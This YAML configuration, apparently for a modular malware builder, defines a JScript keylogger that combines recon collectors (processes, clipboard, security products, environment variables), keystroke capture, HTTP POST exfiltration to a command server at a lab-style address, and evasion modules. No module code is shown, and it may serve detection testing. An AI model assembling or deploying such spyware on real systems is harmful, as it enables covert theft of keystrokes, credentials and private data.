name: js_keylogger_recon
description: Heavy recon keylogger — many collectors plus keystroke capture
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/env_vars
  - collectors/installed_software
  - collectors/security_products
  - collectors/active_windows
  - collectors/clipboard
  - collectors/drives

keylogger: collectors/keylogger_staged

exfil: exfil/http_post
arch: arch/keylogger

evasion:
  - evasion/deferred_exec
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  KEYLOG_DURATION: "30"
